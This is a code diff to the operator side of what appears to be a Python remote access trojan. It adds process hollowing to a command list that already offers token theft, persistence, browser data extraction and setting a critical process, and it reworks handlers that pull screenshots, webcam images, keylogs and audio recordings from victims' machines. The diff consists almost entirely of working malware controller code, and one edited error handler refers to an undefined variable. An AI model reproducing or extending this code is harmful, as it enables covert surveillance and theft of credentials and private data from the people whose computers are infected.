@@ -1,5 +1,6 @@
 # coding=utf-8
 import json
+import ntpath
 import os
 import re
 import socket
@@ -28,6 +29,7 @@ commands = {'help': ['Show this help'],
             'stealtoken': ['Duplicate access token from a running process'],
             'persistence': ['Run automatically at startup'],
             'browser': ['Extract data from web browser'],
+            'runpe': ['Process hollowing'],
             'poweroff': ['Fast shutdown'],
             'setcritical': ['Set as critical process']
             }
@@ -94,8 +96,7 @@ class Server(object):
                 self.socket.close()
                 sys.exit(0)
             except Exception as e:
-                os.system('')
-                print('\033[0;31m[-] Error: ' + str(e) + '\033[0m')
+                show_error('[-] Error: ' + str(e))
 
     def list_connections(self):
         results = ''
@@ -154,22 +155,26 @@ class Server(object):
                     lls()
                     send(conn, 'null')
                 elif cmd.split(' ')[0] == 'upload':
-                    send_file(conn, str(cmd.split(' ')[1].strip()))
+                    upload(conn, cmd)
                 elif cmd.split(' ')[0] == 'download':
+                    file = cmd.split(' ')[1].strip()
                     send(conn, cmd)
-                    recv_file(conn, str(os.path.basename(cmd.split(' ')[1].strip())))
+                    download(conn, file)
                 elif cmd.split(' ')[0] == 'run':
                     send(conn, cmd)
                     print(recv(conn))
                 elif cmd == 'screenshot':
                     send(conn, cmd)
-                    recv_file(conn, 'Screenshot_' + get_time() + '.png')
+                    file = 'Screenshot_' + get_time() + '.png'
+                    download(conn, file)
                 elif cmd == 'webcam':
                     send(conn, cmd)
-                    recv_file(conn, 'Webcam_' + get_time() + '.png')
+                    file = 'Webcam_' + get_time() + '.png'
+                    download(conn, file)
                 elif cmd == 'keylog_stop':
                     send(conn, cmd)
-                    recv_file(conn, 'Keylog_' + get_time() + '.txt')
+                    file = 'Keylog_' + get_time() + '.txt'
+                    download(conn, file)
                     break
                 elif cmd.split(' ')[0] == 'record':
                     send(conn, cmd)
@@ -177,8 +182,8 @@ class Server(object):
                     print(status)
                     if str(status).startswith('[-]'):
                         continue
-                    recv_file(conn, 'Record_' + get_time() + '.wav')
-                    print(recv(conn))
+                    file = 'Record_' + get_time() + '.wav'
+                    download(conn, file)
                 elif cmd in ['idletime', 'setcritical']:
                     send(conn, cmd)
                     print(recv(conn))
@@ -201,7 +206,7 @@ class Server(object):
                         send(conn, 'null')
                         print('[-] File not found')
                         continue
-                    send(conn, 'fsdownload ' + os.path.basename(filename))
+                    send(conn, 'fsdownload ' + ntpath.basename(filename))
                     print(recv(conn))
                 else:
                     send(conn, cmd)
@@ -212,11 +217,11 @@ class Server(object):
                 del self.addresses[target]
                 break
             except KeyboardInterrupt:
+                send(conn, 'null')
                 break
             except Exception as exception:
                 send(conn, 'null')
-                os.system('')
-                print('\033[0;31m[-] Error: ' + str(exception) + '\033[0m')
+                show_error('[-] Error: ' + str(e))
                 continue
 
     def handle_aliases(self, cmd):
@@ -294,6 +299,11 @@ class Server(object):
         print(recv_data(conn))
 
 
+def show_error(msg):
+    os.system('')
+    print('\033[0;31m' + msg + '\033[0m')
+
+
 def print_help():
     print('----- Commands -----')
     for k, v in commands.items():
@@ -338,6 +348,57 @@ def recv_data(conn):
     return data.decode()
 
 
+def send_file(conn, file):
+    sz = struct.pack('i', os.stat(file).st_size)
+    conn.send(sz)
+    with open(file, 'rb') as f:
+        while True:
+            data = f.read(1024)
+            if not data:
+                break
+            conn.send(data)
+
+
+def recv_file(conn, file):
+    sz = struct.unpack('i', conn.recv(4))[0]
+    with open(file, 'wb') as f:
+        while sz:
+            packet = conn.recv(sz)
+            sz -= len(packet)
+            f.write(packet)
+
+
+def upload(conn, cmd):
+    file = cmd.split(' ')[1].strip()
+    try:
+        if os.path.isfile(file):
+            send(conn, 'upload ' + os.path.basename(file))
+            print('[+] File size: ' + str(os.stat(file).st_size) + ', uploading...')
+            send_file(conn, file)
+            print(recv(conn))
+        else:
+            print('[-] File not found')
+            send(conn, 'null')
+    except Exception as e:
+        show_error('[-] Error while uploading: ' + str(e))
+
+
+def download(conn, file):
+    try:
+        sz = struct.unpack('i', conn.recv(4))[0]
+        if not sz:
+            print('[-] File not found')
+            return
+        if sz == -1:
+            print(recv(conn))
+            return
+        print('[+] File size: ' + str(sz) + ' bytes, downloading...')
+        recv_file(conn, ntpath.basename(file))
+        print('[+] File downloaded successfully')
+    except Exception as e:
+        show_error('[-] Error while downloading: ' + str(e))
+
+
 def select(conn, cmds):
     try:
         s = ''
@@ -359,47 +420,6 @@ def select(conn, cmds):
 
 def get_time():
     return str(time.strftime('%Y-%m-%d_%H-%M-%S', time.localtime()))
-
-
-def send_file(conn, filename):
-    if os.path.isfile(filename):
-        send(conn, 'upload ' + os.path.basename(filename))
-        file_size = os.stat(filename).st_size
-        head = struct.pack('i', file_size)
-        print('[+] File size: ' + str(file_size) + ', uploading...')
-        conn.send(head)
-        file = open(filename, 'rb')
-        while True:
-            data = file.read(1024)
-            if not data:
-                break
-            conn.send(data)
-        file.close()
-        print('[+] File uploaded: ' + filename)
-    else:
-        print('[-] File not found')
-        send(conn, 'null')
-
-
-def recv_file(conn, filename):
-    isfile = int(struct.unpack('i', conn.recv(4))[0])
-    if not isfile:
-        print('[-] File not found')
-        return
-    file_size, = struct.unpack('i', conn.recv(4))
-    print('[+] File size: ' + str(file_size) + ' bytes, downloading...')
-    recv_size = 0
-    file = open(filename, 'wb')
-    while not recv_size == file_size:
-        if file_size - recv_size > 1024:
-            data = conn.recv(1024)
-            recv_size += len(data)
-        else:
-            data = conn.recv(file_size - recv_size)
-            recv_size = file_size
-        file.write(data)
-    file.close()
-    print('[+] File saved: ' + filename)
 
 
 server = Server()
